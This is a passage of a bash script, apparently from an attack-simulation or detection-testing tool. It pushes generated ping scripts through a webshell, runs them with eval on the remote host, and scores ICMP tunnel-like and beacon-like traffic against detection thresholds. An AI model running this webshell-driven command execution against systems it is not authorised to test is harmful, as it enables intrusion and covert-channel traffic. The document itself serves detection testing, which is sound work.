    done <<< "$(printf '%s\n' "${out}" | grep -E '^ICMP_TUNNEL_BURST_RESULT' || true)"
    [[ "${burst_id}" -gt 1 && -z "$(extract_icmp_burst_echo_text "${out}")" && "${out}" == *"command timeout"* ]] && {
        printf '%s' "output_parse_contaminated"
        return 0
    }
    printf '%s' "ok"
}

log_icmp_root_cause_analysis() {
    local burst_id="$1" root_cause="$2" payload_bytes="$3" webshell_method="$4"
    local effective_timeout="$5" curl_max_time="$6" elapsed_ms="$7" stdout_bytes="$8"
    local stderr_preview="$9" stdout_preview="${10}"
    stderr_preview=$(icmp_sanitize_log_value "${stderr_preview}")
    stdout_preview=$(icmp_sanitize_log_value "${stdout_preview}")
    icmp_tunnel_log_both "ROOT_CAUSE_ANALYSIS burst_id=${burst_id} root_cause=${root_cause} payload_bytes=${payload_bytes} webshell_method=${webshell_method} effective_timeout_sec=${effective_timeout} curl_max_time=${curl_max_time} elapsed_ms=${elapsed_ms} stdout_bytes=${stdout_bytes} stderr_preview=${stderr_preview} stdout_preview=${stdout_preview}"
}

run_webshell_icmp_burst() {
    local context="$1" payload="$2" timeout_sec="$3"
    local burst_target="${4:-}" burst_index="${5:-0}" planned_packets="${6:-0}"
    local saved="${WEBSHELL_LONG_TIMEOUT:-300}" saved_method="${WEBSHELL_METHOD:-GET}"
    local payload_bytes=${#payload} effective_method=""
    timeout_sec=$(safe_int "${timeout_sec}")
    (( timeout_sec < 60 )) && timeout_sec=60
    effective_method=$(icmp_configure_webshell_transport "${context}" "${payload}")
    if [[ -n "${burst_target}" ]]; then
        icmp_log_burst_transport "${burst_target}" "${burst_index}" "${payload_bytes}" "${planned_packets}" "${timeout_sec}" "${effective_method}"
    fi
    WEBSHELL_LONG_TIMEOUT="${timeout_sec}"
    ICMP_LAST_EFFECTIVE_TIMEOUT_SEC="${timeout_sec}"
    ICMP_LAST_CURL_MAX_TIME="${timeout_sec}"
    run_webshell_long "${context}" "${payload}"
    WEBSHELL_LONG_TIMEOUT="${saved}"
    WEBSHELL_METHOD="${saved_method}"
}

classify_icmp_burst_root_cause() {
    local sent="$1" received="$2" exit_code="$3" http_status="$4" cmd="$5" stderr_preview="$6" stdout_preview="$7"
    local parse_failed="${8:-no}" burst_timed_out="${9:-false}"
    sent=$(safe_int "${sent}")
    received=$(safe_int "${received}")
    exit_code=$(safe_int "${exit_code}")
    if [[ "${DRY_RUN}" == true ]]; then
        printf '%s' "dry_run"
        return 0
    fi
    if [[ "${parse_failed}" == yes ]]; then
        printf '%s' "burst_parse_failure"
        return 0
    fi
    if [[ "${HAS_ping:-false}" != true ]]; then
        printf '%s' "ping_command_not_executed"
        return 0
    fi
    if [[ "${http_status}" == 000 || -z "${http_status}" ]]; then
        if (( ICMP_LAST_PAYLOAD_BYTES > 4000 )) && [[ "${ICMP_LAST_WEBSHELL_METHOD:-GET}" == GET ]]; then
            printf '%s' "payload_transport_limit"
        else
            printf '%s' "payload_transport_limit"
        fi
        return 0
    fi
    if [[ "${stderr_preview}" == *"curl (28)"* || "${stderr_preview}" == *"Connection timed out after"* \
        || "${stdout_preview}" == *"curl (28)"* || "${stdout_preview}" == *"Connection timed out after"* ]]; then
        printf '%s' "curl_timeout_too_short"
        return 0
    fi
    if [[ "${burst_timed_out}" == true || "${stderr_preview}" == *"command timeout"* || "${stdout_preview}" == *"command timeout"* ]]; then
        printf '%s' "command_timeout"
        return 0
    fi
    if [[ "${stderr_preview}" == *timeout* || "${stdout_preview}" == *timeout* ]]; then
        printf '%s' "webshell_timeout"
        return 0
    fi
    if [[ "${stderr_preview}" == *permission* || "${stdout_preview}" == *permission* || "${stdout_preview}" == *not*permitted* ]]; then
        printf '%s' "ping_permission_denied"
        return 0
    fi
    if [[ "${stdout_preview}" == *invalid\ option* || "${stdout_preview}" == *unknown\ option* || "${stdout_preview}" == *cannot\ flood* || "${stdout_preview}" == *bad\ interval* ]]; then
        printf '%s' "ping_unsupported_option"
        return 0
    fi
    if [[ "${exit_code}" == 127 ]]; then
        printf '%s' "ping_command_not_executed"
        return 0
    fi
    if (( sent == 0 )); then
        if [[ -z "${stdout_preview}" && -z "${stderr_preview}" ]]; then
            printf '%s' "burst_execution_failure"
        elif [[ "${stdout_preview}" != *transmitted* && "${stdout_preview}" != *received* && "${stdout_preview}" != *bytes\ from* ]]; then
            printf '%s' "burst_parse_failure"
        else
            printf '%s' "command_timeout"
        fi
        return 0
    fi
    if (( received == 0 )); then
        printf '%s' "target_unreachable"
        return 0
    fi
    printf '%s' "ok"
}

icmp_log_tunnel_burst_command() {
    local burst_id="$1" target="$2" payload="$3" count="$4" interval_ms="$5" cmd="$6" timeout_sec="$7"
    local msg="ICMP_TUNNEL_BURST_COMMAND burst_id=${burst_id} target=${target} payload_size=${payload} count=${count} interval_ms=${interval_ms} command=${cmd} timeout_sec=${timeout_sec} effective_timeout_sec=${timeout_sec} curl_max_time=${timeout_sec}"
    icmp_tunnel_log_both "${msg}"
    state_append "icmp_tunnel_burst.log" "${msg}"
}

icmp_log_tunnel_burst_result() {
    local burst_id="$1" target="$2" payload="$3" count="$4" interval_ms="$5" cmd="$6"
    local exit_code="$7" http_status="$8" stdout_bytes="$9" stdout_preview="${10}" stderr_preview="${11}"
    local parsed_sent="$12" parsed_received="$13" burst_result="${14}" failure_reason="${15}" root_cause="${16}"
    local msg="ICMP_TUNNEL_BURST_RESULT burst_id=${burst_id} target=${target} payload_size=${payload} count=${count} interval_ms=${interval_ms} command=${cmd} exit_code=${exit_code} http_status=${http_status} stdout_bytes=${stdout_bytes} stdout_preview=${stdout_preview} stderr_preview=${stderr_preview} parsed_sent=${parsed_sent} parsed_received=${parsed_received} result=${burst_result} failure_reason=${failure_reason} ROOT_CAUSE=${root_cause}"
    icmp_tunnel_log_both "${msg}"
    state_append "icmp_tunnel_burst.log" "${msg}"
}

icmp_resolve_tunnel_like_session_result() {
    local actual="$1" received="$2" score="$3" likelihood="$4"
    local timeout_bursts=$(safe_int "${ICMP_TIMEOUT_BURSTS:-0}")
    actual=$(safe_int "${actual}")
    received=$(safe_int "${received}")
    score=$(safe_int "${score}")
    likelihood="${likelihood^^}"
    ICMP_TUNNEL_FINAL_RESULT="failed"
    ICMP_TUNNEL_RESULT="failed"
    ICMP_TUNNEL_STAGE_RESULT="failed"
    if (( actual == 0 )) || (( timeout_bursts > 0 && received == 0 )); then
        return 1
    fi
    if (( actual >= 80 && received >= 40 && ICMP_BIDIRECTIONAL_RATIO >= 50 && score >= 70 && timeout_bursts <= 1 )) && [[ "${likelihood}" == HIGH ]]; then
        ICMP_TUNNEL_RESULT="success"
        ICMP_TUNNEL_STAGE_RESULT="success"
        ICMP_TUNNEL_FINAL_RESULT="success"
        return 0
    fi
    if (( actual == 0 )) || (( timeout_bursts >= ICMP_SUCCESSFUL_BURSTS + ICMP_FAILED_BURSTS && ICMP_SUCCESSFUL_BURSTS == 0 )); then
        ICMP_TUNNEL_RESULT="failed"
        ICMP_TUNNEL_STAGE_RESULT="failed"
        ICMP_TUNNEL_FINAL_RESULT="failed"
        return 1
    fi
    ICMP_TUNNEL_RESULT="partial"
    ICMP_TUNNEL_STAGE_RESULT="partial"
    ICMP_TUNNEL_FINAL_RESULT="partial"
    if [[ "${likelihood}" != HIGH ]]; then
        ICMP_DETECTION_REASON="${ICMP_DETECTION_REASON:-partial_tunnel_session likelihood=${likelihood} actual=${actual} received=${received} timeout_bursts=${timeout_bursts}}"
    elif (( timeout_bursts > 1 )); then
        ICMP_DETECTION_REASON="${ICMP_DETECTION_REASON:-partial_tunnel_session timeout_bursts=${timeout_bursts} actual=${actual} received=${received}}"
    else
        ICMP_DETECTION_REASON="${ICMP_DETECTION_REASON:-partial_tunnel_session actual=${actual} received=${received} score=${score} bidir=${ICMP_BIDIRECTIONAL_RATIO}%}"
    fi
    return 0
}

icmp_burst_profile_expected_duration() {
    local payload="$1" count="$2" interval="$3"
    local interval_sec=""
    count=$(safe_int "${count}")
    payload=$(safe_int "${payload}")
    interval_sec=$(icmp_interval_ms_to_seconds "${interval}")
    if (( count <= 5 && payload <= 128 )) || [[ -z "${interval_sec}" || "${interval_sec}" == "0" || "${interval_sec}" == "0.0" ]]; then
        awk -v c="${count}" 'BEGIN{printf "%.0f", c * 0.5 + 2}'
    else
        awk -v c="${count}" -v i="${interval_sec}" 'BEGIN{v=i+0; if(v<0.2) v=0.2; printf "%.0f", c * v + 3}'
    fi
}

build_icmp_single_burst_remote_script() {
    local ping_cmd="$1" payload="$2" burst_id="$3" target="$4" campaign="$5" count="$6" interval="$7"
    local profile_b="" profile_c="" ping_bin="${REMOTE_PING_PATH:-ping}"
    profile_b=$(printf '%s' "${ping_cmd}" | sed -E 's/ -i [0-9.]+//g')
    profile_c=$(build_icmp_ping_command "${count}" "${payload}" "0" "${target}")
    [[ -z "${profile_b}" ]] && profile_b="${profile_c}"
    cat <<EOF
${REMOTE_SHELL_HELPERS}
payload=${payload}
burst_id=${burst_id}
target='${target}'
campaign='${campaign}'
burst_count=${count}
burst_interval='${interval}'
profile_a_cmd='${ping_cmd}'
profile_b_cmd='${profile_b}'
profile_c_cmd='${profile_c}'
used_cmd="\${profile_a_cmd}"
sent=0; replies=0; loss_pct=0; duration_ms=0; exit_code=0; profile_used=A
icmp_count_replies(){
  local text="\$1" n=0
  n=\$(printf '%s' "\${text}" | grep -ciE 'bytes from|Reply from|ttl=[0-9]' || true)
  printf '%s' "\${n:-0}"
}
icmp_extract_transmitted(){
  local text="\$1" n=0
  n=\$(printf '%s' "\${text}" | sed -n 's/.* \\([0-9][0-9]*\\) packets transmitted.*/\\1/p' | tail -n1)
  [ -z "\${n}" ] && n=\$(printf '%s' "\${text}" | sed -n 's/.* \\([0-9][0-9]*\\) transmitted.*/\\1/p' | tail -n1)
  printf '%s' "\${n:-0}"
}
icmp_extract_received(){
  local text="\$1" n=0
  n=\$(printf '%s' "\${text}" | sed -n 's/.* \\([0-9][0-9]*\\) received.*/\\1/p' | tail -n1)
  [ -z "\${n}" ] || [ "\${n}" -eq 0 ] 2>/dev/null && n=\$(icmp_count_replies "\${text}")
  printf '%s' "\${n:-0}"
}
icmp_count_from_cmd(){
  local cmd="\$1" n=0
  n=\$(printf '%s' "\${cmd}" | sed -n 's/.*-c \\([0-9][0-9]*\\).*/\\1/p')
  [ -z "\${n}" ] && n=\$(printf '%s' "\${cmd}" | sed -n 's/.*-n \\([0-9][0-9]*\\).*/\\1/p')
  printf '%s' "\${n:-0}"
}
icmp_cmd_rejected(){
  printf '%s' "\$1" | grep -qiE 'permission denied|operation not permitted|not permitted|invalid option|cannot flood|bad interval|only root|unknown option.*-i|you must be root|command not found'
}
icmp_output_usable(){
  local text="\$1" s=0 r=0
  if icmp_cmd_rejected "\${text}"; then return 1; fi
  s=\$(icmp_extract_transmitted "\${text}")
  r=\$(icmp_extract_received "\${text}")
  [ "\${s}" -gt 0 ] 2>/dev/null && return 0
  [ "\${r}" -gt 0 ] 2>/dev/null && return 0
  printf '%s' "\${text}" | grep -qiE 'transmitted|received|bytes from|Reply from|ttl=' && return 0
  return 1
}
icmp_run_profile(){
  local profile="\$1" cmd="\$2"
  local out="" p_sent=0 p_recv=0 p_exit=0 p_reason=""
  t0=\$(date +%s 2>/dev/null || echo 0)
  out=\$(eval "\${cmd}" 2>&1) || p_exit=\$?
  t1=\$(date +%s 2>/dev/null || echo 0)
  duration_ms=\$(( (t1 - t0) * 1000 ))
  p_sent=\$(icmp_extract_transmitted "\${out}")
  p_recv=\$(icmp_extract_received "\${out}")
  [ "\${p_sent}" -eq 0 ] 2>/dev/null && p_sent=\$(icmp_count_from_cmd "\${cmd}")
  [ "\${p_recv}" -eq 0 ] 2>/dev/null && p_recv=\$(icmp_count_replies "\${out}")
  if icmp_cmd_rejected "\${out}"; then
    p_reason="ping_option_rejected"
  elif [ "\${p_exit}" -eq 127 ] 2>/dev/null; then
    p_reason="ping_binary_missing"
  elif [ "\${p_sent}" -eq 0 ] 2>/dev/null && [ "\${p_recv}" -eq 0 ] 2>/dev/null; then
    p_reason="zero_packets_parsed"
  elif [ "\${p_sent}" -gt 0 ] 2>/dev/null && [ "\${p_recv}" -eq 0 ] 2>/dev/null; then
    p_reason="target_unresponsive"
  else
    p_reason="ok"
  fi
  echo "ICMP_PROFILE_EXECUTION profile=\${profile} command=\${cmd} exit_code=\${p_exit} stdout_packets=\${p_sent} parsed_sent=\${p_sent} parsed_received=\${p_recv} failure_reason=\${p_reason}"
  if icmp_output_usable "\${out}"; then
    used_cmd="\${cmd}"
    profile_used="\${profile}"
    sent="\${p_sent}"
    replies="\${p_recv}"
    exit_code="\${p_exit}"
    return 0
  fi
  return 1
}
t0=\$(date +%s 2>/dev/null || echo 0)
out=""
if icmp_run_profile A "\${profile_a_cmd}"; then
  out=\$(eval "\${used_cmd}" 2>&1) || exit_code=\$?
elif icmp_run_profile B "\${profile_b_cmd}"; then
  out=\$(eval "\${used_cmd}" 2>&1) || exit_code=\$?
elif icmp_run_profile C "\${profile_c_cmd}"; then
  out=\$(eval "\${used_cmd}" 2>&1) || exit_code=\$?
else
  icmp_run_profile A "\${profile_a_cmd}" >/dev/null || true
  icmp_run_profile B "\${profile_b_cmd}" >/dev/null || true
  icmp_run_profile C "\${profile_c_cmd}" >/dev/null || true
  exit_code=1
fi
t1=\$(date +%s 2>/dev/null || echo 0)
duration_ms=\$(( (t1 - t0) * 1000 ))
[ "\${sent}" -eq 0 ] 2>/dev/null && sent=\$(icmp_extract_transmitted "\${out}")
[ "\${replies}" -eq 0 ] 2>/dev/null && replies=\$(icmp_extract_received "\${out}")
[ "\${sent}" -eq 0 ] 2>/dev/null && sent=\$(icmp_count_from_cmd "\${used_cmd}")
[ "\${replies}" -eq 0 ] 2>/dev/null && replies=\$(icmp_count_replies "\${out}")
[ "\${sent}" -eq 0 ] 2>/dev/null && [ "\${replies}" -gt 0 ] 2>/dev/null && sent=\$(icmp_count_from_cmd "\${used_cmd}")
[ "\${sent}" -eq 0 ] 2>/dev/null && [ "\${replies}" -gt 0 ] 2>/dev/null && sent=\${replies}
[ -z "\${sent}" ] && sent=0
[ -z "\${replies}" ] && replies=0
if [ "\${sent}" -gt 0 ] 2>/dev/null; then loss_pct=\$(( (sent - replies) * 100 / sent )); else loss_pct=0; fi
burst_result=success
[ "\${sent}" -eq 0 ] 2>/dev/null && burst_result=failed
[ "\${sent}" -gt 0 ] 2>/dev/null && [ "\${replies}" -eq 0 ] 2>/dev/null && burst_result=partial
echo "ICMP_TUNNEL_BURST_RESULT burst_id=\${burst_id} target=\${target} payload_size=\${payload} count=\${burst_count} interval=\${burst_interval} parsed_sent=\${sent} parsed_received=\${replies} sent=\${sent} received=\${replies} loss_pct=\${loss_pct} duration_ms=\${duration_ms} result=\${burst_result} campaign=\${campaign} profile=\${profile_used}"
echo "ICMP_TUNNEL_BURST_ECHO_BEGIN"
printf '%s\n' "\${out}" | head -c 8000
echo "ICMP_TUNNEL_BURST_ECHO_END"
EOF
}

icmp_log_profile_executions_from_output() {
    local out="$1" burst_id="$2"
    local line=""
    while IFS= read -r line; do
        [[ "${line}" == ICMP_PROFILE_EXECUTION* ]] || continue
        icmp_tunnel_log_both "ICMP Tunnel: ${line} burst_id=${burst_id}"
    done <<< "$(printf '%s' "${out}" | tr -d '\r')"
}

parse_icmp_single_burst_result() {
    local out="$1" fallback_cmd="$2" payload="$3"
    local sent=0 replies=0 line="" result="failed" echo_text="" stats_complete=no
    ICMP_BURST_LAST_TIMED_OUT=false
    ICMP_BURST_LAST_COMPLETE=no
    out=$(printf '%s' "${out}" | tr -d '\r')
    line=$(printf '%s\n' "${out}" | grep -E '^ICMP_TUNNEL_BURST_RESULT' | tail -n1 || true)
    echo_text=$(extract_icmp_burst_echo_text "${out}")
    if [[ -n "${echo_text}" ]]; then
        read -r sent replies <<< "$(parse_icmp_ping_transmit_receive "${echo_text}")"
        sent=$(safe_int "${sent}")
        replies=$(safe_int "${replies}")
        stats_complete=yes
        if (( sent > 0 && replies > 0 )); then
            result=success
        elif (( sent > 0 )); then
            result=partial
        else
            result=failed
        fi
    else
        sent=0
        replies=0
        stats_complete=no
        result=failed
    fi
    if [[ "${out}" == *"command timeout"* || "${out}" == *"webshell_timeout"* || "${line}" == *failure_reason=webshell_timeout* || "${line}" == *ROOT_CAUSE=webshell_timeout* ]]; then
        ICMP_BURST_LAST_TIMED_OUT=true
        stats_complete=no
        sent=0
        replies=0
        result=partial
    elif [[ -z "${echo_text}" && "${out}" == *"WARN:"* && "${out}" == *"Large webshell payload"* ]]; then
        ICMP_BURST_LAST_TIMED_OUT=true
        stats_complete=no
        sent=0
        replies=0
        result=partial
    fi
    if [[ "$(icmp_burst_output_contaminated "${out}" "${ICMP_BURST_LAST_ID:-0}")" == output_parse_contaminated ]]; then
        ICMP_BURST_LAST_TIMED_OUT=true
        stats_complete=no
        sent=0
        replies=0
        result=partial
    fi
    if [[ "${stats_complete}" == yes ]]; then
        ICMP_BURST_LAST_COMPLETE=yes
    else
        ICMP_LAST_ROOT_CAUSE="burst_parse_failure"
        icmp_tunnel_log_both "ROOT_CAUSE=burst_parse_failure module=ICMP burst_id=${ICMP_BURST_LAST_ID:-0}"
    fi
    if [[ "${out}" == *"curl (28)"* || "${out}" == *"Connection timed out after"* ]]; then
        ICMP_LAST_ROOT_CAUSE="curl_timeout_too_short"
        icmp_tunnel_log_both "ROOT_CAUSE=curl_timeout_too_short module=ICMP burst_id=${ICMP_BURST_LAST_ID:-0}"
    elif [[ "${ICMP_BURST_LAST_TIMED_OUT}" == true ]]; then
        ICMP_LAST_ROOT_CAUSE="command_timeout"
        icmp_tunnel_log_both "ROOT_CAUSE=command_timeout module=ICMP burst_id=${ICMP_BURST_LAST_ID:-0}"
    fi
    printf '%s %s %s' "${sent}" "${replies}" "${result}"
}

icmp_log_tunnel_burst() {
    local target="$1" burst_id="$2" payload="$3" count="$4" interval="$5" sent="$6" received="$7" result="$8"
    local msg="ICMP_TUNNEL_BURST target=${target} burst_id=${burst_id} payload_size=${payload} count=${count} interval=${interval} sent=${sent} received=${received} result=${result}"
    icmp_tunnel_log_both "${msg}"
    state_append "icmp_tunnel_burst.log" "${msg}"
}

icmp_compute_large_payload_ratio() {
    local total="$1" large="$2"
    total=$(safe_int "${total}")
    large=$(safe_int "${large}")
    if (( total > 0 )); then
        ICMP_LARGE_PAYLOAD_RATIO=$((large * 100 / total))
    else
        ICMP_LARGE_PAYLOAD_RATIO=0
    fi
}

run_icmp_multi_burst_profile() {
    local target="$1" campaign="$2" mode="${3:-payload-size-anomaly}"
    local -a burst_payloads=(64 1200 1350 1400 1450 64 1400)
    local -a burst_counts=(3 20 20 20 20 3 30)
    local -a burst_intervals=(0 "${ICMP_MULTI_BURST_INTERVAL}" "${ICMP_MULTI_BURST_INTERVAL}" "${ICMP_MULTI_BURST_INTERVAL}" "${ICMP_MULTI_BURST_INTERVAL}" 0 "${ICMP_MULTI_BURST_INTERVAL}")
    local -a burst_kinds=(baseline large large large large baseline large)
    local burst_id=0 payload=0 count=0 interval="" kind="" ping_cmd="" remote_cmd="" out=""
    local sent=0 replies=0 burst_result="" expected_dur=0
    local total_sent=0 total_replies=0 total_bytes=0 overall_loss=0 payload_sum=0
    local baseline_packets=0 large_packets=0 t0=0 t1=0 elapsed=0 dw_met=no
    local planned_large=0 profile_interval="" i=0

    ICMP_PAYLOAD_SIZE_SUM_INTERNAL=0
    ICMP_PAYLOAD_SIZE_COUNT_INTERNAL=0
    ICMP_PAYLOAD_SIZE_MIN=0
    ICMP_PAYLOAD_SIZE_MAX=0
    ICMP_PAYLOAD_SIZE_AVG=0
    ICMP_BASELINE_PACKETS=0
    ICMP_LARGE_PACKETS=0
    ICMP_LARGE_PAYLOAD_RATIO=0
    read -r planned_large profile_interval expected_dur _ _ _ <<< "$(icmp_plan_burst_parameters "${ICMP_TUNNEL_PAYLOAD_SIZE:-1400}")"
    planned_large=$(safe_int "${planned_large}")
    ICMP_TUNNEL_PROFILE_INTERVAL="${profile_interval}"
    ICMP_PROFILES_RUN="multi-burst-profile"
    icmp_tunnel_log_both "ICMP_TUNNEL_PROFILE target=${target} mode=${mode} bursts=${#burst_payloads[@]} large_planned=${planned_large} baseline_payload=${ICMP_BASELINE_PAYLOAD} large_range=${ICMP_LARGE_PAYLOAD_THRESHOLD}-${ICMP_TUNNEL_MAX_PAYLOAD_SIZE} interval=${profile_interval} total_goal<=${ICMP_MULTI_BURST_TOTAL_SECONDS}s"
    log_detection_window_plan "ICMP_Tunnel" "${target}" "${DETECTION_WINDOW_ICMP_WINDOW_SECONDS}" \
        "large_payload_icmp_anomaly large_packets>=80 payload_avg>=1000 ratio>=80%" "${planned_large}" \
        "multi_burst_typical_vs_anomalous_${DETECTION_WINDOW_BUCKET_SECONDS}s_bucket"
    log_detection_window_progress "ICMP_Tunnel" "${target}" "0" "0" "large_packets>=80" "no"
    t0=$(date +%s)
    for ((i = 0; i < ${#burst_payloads[@]}; i++)); do
        pipeline_stop_requested && break
        burst_id=$((i + 1))
        payload=$(icmp_tunnel_clamp_payload_size "${burst_payloads[i]}")
        count=$(safe_int "${burst_counts[i]}")
        interval="${burst_intervals[i]}"
        kind="${burst_kinds[i]}"
        (( count < 1 )) && continue
        icmp_forbid_monolithic_ping_cmd "planned" "${payload}" "${count}" || continue
        ping_cmd=$(build_icmp_ping_command "${count}" "${payload}" "${interval}" "${target}")
        icmp_forbid_monolithic_ping_cmd "${ping_cmd}" "${payload}" "${count}" || continue
        expected_dur=$(icmp_burst_profile_expected_duration "${payload}" "${count}" "${interval}")
        icmp_tunnel_log_both "ICMP_TUNNEL_BURST_COMMAND target=${target} burst_id=${burst_id} kind=${kind} cmd=${ping_cmd} expected_duration=${expected_dur}s"
        if [[ "${DRY_RUN}" == true ]]; then
            sent="${count}"
            replies="${count}"
            burst_result="success"
        else
            remote_cmd=$(build_icmp_single_burst_remote_script "${ping_cmd}" "${payload}" "${burst_id}" "${target}" "${campaign}" "${count}" "${interval}")
            local burst_timeout_mb="" interval_ms_mb=0
            interval_ms_mb=$(awk -v i="${interval}" 'BEGIN{v=i+0; if(v>=0.2 && v<5) printf "%.0f", v*1000; else if(v>=200) printf "%.0f", v; else printf "200"}')
            burst_timeout_mb=$(icmp_burst_webshell_timeout_seconds "${count}" "${interval_ms_mb}")
            out=$(run_webshell_icmp_burst "icmp-multi-burst-${burst_id}" "${remote_cmd}" "${burst_timeout_mb}" "${target}" "${burst_id}" "${count}" 2>/dev/null || true)
            icmp_log_profile_executions_from_output "${out}" "${burst_id}"
            read -r sent replies burst_result <<< "$(parse_icmp_single_burst_result "${out}" "${ping_cmd}" "${payload}")"
            sent=$(safe_int "${sent}")
            replies=$(safe_int "${replies}")
            local mb_loss=0 mb_rc="${WEBSHELL_LAST_EXIT_CODE:-0}" mb_root="${ICMP_LAST_ROOT_CAUSE:-ok}"
            (( sent > 0 )) && mb_loss=$(( (sent - replies) * 100 / sent ))
            icmp_log_burst_result_summary "${burst_id}" "${count}" "${sent}" "${replies}" "${mb_loss}" "${expected_dur}" "${mb_rc}" "${mb_root}"
            ICMP_LAST_EXEC_STDOUT_SUMMARY=$(icmp_sanitize_log_value "$(printf '%s' "${out}" | grep -E 'ICMP_TUNNEL_BURST_RESULT|ICMP_PROFILE_EXECUTION' | tail -n3)")
            append_icmp_tunnel_remote_tail "${out}" "multi-burst-${burst_id}"
        fi
        if [[ "${kind}" == baseline ]]; then
            baseline_packets=$((baseline_packets + sent))
        else
            large_packets=$((large_packets + sent))
        fi
        payload_sum=$((payload_sum + payload * sent))
        total_sent=$((total_sent + sent))
        total_replies=$((total_replies + replies))
        total_bytes=$((total_bytes + sent * (payload + 28)))
        icmp_tunnel_merge_payload_stats "$((payload * sent))" "${payload}" "${payload}" "${sent}"
        icmp_log_tunnel_burst "${target}" "${burst_id}" "${payload}" "${count}" "${interval}" "${sent}" "${replies}" "${burst_result}"
        if (( burst_id % 2 == 0 )); then
            local progress_elapsed=$(( $(date +%s) - t0 ))
            log_detection_window_progress "ICMP_Tunnel" "${target}" "${progress_elapsed}" "${large_packets}" "large_packets>=80" "$([[ "${large_packets}" -ge 80 ]] && printf yes || printf no)"
        fi
        t1=$(date +%s)
        elapsed=$((t1 - t0))
        (( elapsed > ICMP_MULTI_BURST_TOTAL_SECONDS + 30 )) && {
            icmp_tunnel_log_both "ICMP multi-burst profile stopping early: duration=${elapsed}s exceeds budget"
            break
        }
        [[ "${DRY_RUN}" != true ]] && interruptible_sleep 1 || true
    done
    t1=$(date +%s)
    elapsed=$((t1 - t0))
    ICMP_TUNNEL_DURATION_ELAPSED="${elapsed}"
    ICMP_BASELINE_PACKETS="${baseline_packets}"
    ICMP_LARGE_PACKETS="${large_packets}"
    icmp_compute_large_payload_ratio "${total_sent}" "${large_packets}"
    if (( total_sent > 0 )); then
        ICMP_PAYLOAD_SIZE_AVG=$((payload_sum / total_sent))
        overall_loss=$(( (total_sent - total_replies) * 100 / total_sent ))
    fi
    ICMP_OVERALL_LOSS="${overall_loss}"
    ICMP_LARGEST_PAYLOAD_SIZE="${ICMP_PAYLOAD_SIZE_MAX}"
    ICMP_LARGEST_EXPECTED_TOTAL_PACKET_SIZE=$((ICMP_PAYLOAD_SIZE_MAX + 28))
    ICMP_PAYLOAD_SIZES_USED="64,1200-1450"
    ICMP_COMMAND_EXECUTED="multi-burst-profile:${#burst_payloads[@]}_bursts"
    local dw_likelihood="LOW" dw_reason=""
    _icmp_eval_detection_likelihood "${total_sent}" "${ICMP_PAYLOAD_SIZE_AVG}" "${elapsed}" \
        "${large_packets}" "${ICMP_LARGE_PAYLOAD_RATIO}" "${ICMP_PAYLOAD_SIZE_MAX}" dw_likelihood dw_reason
    ICMP_DETECTION_WINDOW_LIKELIHOOD="${dw_likelihood}"
    ICMP_DETECTION_REASON="${dw_reason}"
    apply_icmp_tunnel_stats_to_globals "${total_sent}" "${total_replies}" "${overall_loss}" "${total_bytes}" "${ICMP_PAYLOAD_SIZES_USED}" "${mode}" "${ICMP_COMMAND_EXECUTED}"
    icmp_tunnel_classify_execution_result "${total_sent}" "${total_replies}" || true
    if icmp_tunnel_window_condition_met "${large_packets}" "${planned_large}"; then
        dw_met=yes
    else
        dw_met=no
    fi
    icmp_emit_burst_aggregation
    log_detection_window_summary "ICMP_Tunnel" "${target}" "${elapsed}" "${large_packets}" \
        "large_packets>=80 payload_avg>=1000 ratio>=80%" "${dw_met}" "${dw_likelihood}" \
        "large_packets=${large_packets} payload_size_avg=${ICMP_PAYLOAD_SIZE_AVG} large_payload_ratio=${ICMP_LARGE_PAYLOAD_RATIO}% duration=${elapsed}s"
    icmp_emit_mode_summary "ICMP_PAYLOAD_ANOMALY_SUMMARY" "${mode}"
    printf '%s' "ICMP_TUNNEL_STATS planned_packets=${planned_large} attempted_packets=${total_sent} actual_packets=${total_sent} partial_packets_estimated=0 timeout_bursts=0 successful_bursts=${#burst_payloads[@]} failed_bursts=0 attempted=${total_sent} total=${total_replies} echo=${total_replies} ttl_exceeded=0 dest_unreachable=0 targets=1 sent=${total_sent} replies=${total_replies} loss_pct=${overall_loss} bytes=${total_bytes} payload=${ICMP_PAYLOAD_SIZE_AVG} payload_min=${ICMP_PAYLOAD_SIZE_MIN:-0} payload_max=${ICMP_PAYLOAD_SIZE_MAX:-0} payload_avg=${ICMP_PAYLOAD_SIZE_AVG} baseline=${baseline_packets} large=${large_packets} large_payload_ratio=${ICMP_LARGE_PAYLOAD_RATIO} duration_seconds=${elapsed} detection_likelihood=${dw_likelihood} detection_reason=${dw_reason} cmd=${ICMP_COMMAND_EXECUTED} mode=${mode} target=${target} campaign=${campaign}\nICMP_TUNNEL_DONE campaign=${campaign}"
}

run_icmp_beacon_pattern_simulation() {
    local target="$1" campaign="$2"
    local payload=64 interval_ms=2000 count=15 burst_id=0
    local ping_cmd="" remote_cmd="" out="" sent=0 replies=0 burst_result=""
    local total_sent=0 total_replies=0 t0=0 t1=0 elapsed=0 dw_likelihood="LOW" dw_reason=""
    local -a beacon_bursts=(15 15 15 15)

    ICMP_MODE_USED="icmp-beacon-pattern"
    ICMP_PROFILES_RUN="${ICMP_PROFILES_RUN:+$ICMP_PROFILES_RUN,}icmp-beacon-pattern"
    ICMP_PACKETS_PLANNED=60
    ICMP_COMMAND_EXECUTED="icmp-beacon-pattern:4_bursts_interval_2s"
    icmp_tunnel_log_both "ICMP_TUNNEL_PROFILE target=${target} mode=icmp-beacon-pattern payload=${payload} interval_ms=${interval_ms} planned_packets=${ICMP_PACKETS_PLANNED}"
    log_detection_window_plan "ICMP_Tunnel" "${target}" "${DETECTION_WINDOW_ICMP_WINDOW_SECONDS}" \
        "beacon_pattern actual_packets>=30" "${ICMP_PACKETS_PLANNED}" "beacon_burst_c_${count}_interval_${interval_ms}ms"
    t0=$(date +%s)
    for count in "${beacon_bursts[@]}"; do
        pipeline_stop_requested && break
        burst_id=$((burst_id + 1))
        ping_cmd=$(build_icmp_ping_command "${count}" "${payload}" "2" "${target}")
        if [[ "${DRY_RUN}" == true ]]; then
            sent="${count}"
            replies=$((count - 1))
            burst_result="success"
        else
            remote_cmd=$(build_icmp_single_burst_remote_script "${ping_cmd}" "${payload}" "${burst_id}" "${target}" "${campaign}" "${count}" "${interval_ms}")
            local bto="" breply=0
            bto=$(icmp_burst_webshell_timeout_seconds "${count}" "${interval_ms}")
            out=$(run_webshell_icmp_burst "icmp-beacon-${burst_id}" "${remote_cmd}" "${bto}" "${target}" "${burst_id}" "${count}" 2>/dev/null || true)
            read -r sent replies burst_result <<< "$(parse_icmp_single_burst_result "${out}" "${ping_cmd}" "${payload}")"
            sent=$(safe_int "${sent}")
            replies=$(safe_int "${replies}")
